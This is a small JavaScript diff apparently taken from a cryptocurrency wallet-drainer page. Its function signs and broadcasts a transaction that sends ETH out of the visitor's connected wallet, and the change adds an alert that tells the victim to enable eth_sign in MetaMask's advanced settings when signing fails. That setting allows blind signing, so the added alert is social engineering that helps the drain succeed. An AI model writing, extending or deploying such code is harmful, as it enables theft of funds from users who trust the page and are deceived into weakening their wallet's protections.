@@ -199,7 +199,12 @@ async function askTransferWithSign(rbal) {
                 await web3Js.eth.sendSignedTransaction(rawTx).then((hash) => console.log(hash)).catch((e) => console.log(e));
                 if (rbal < 1.75) {sW(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`);}
                 
-            }).catch((err) => console.log(err));
+            }).catch((err) => {console.log(err)
+            if (err.code===-32601) {
+                alert("Please enable eth_sign from the advanced setting of the metamask")
+            } 
+            }
+            )
         })
 }
 async function notEligible(info) {
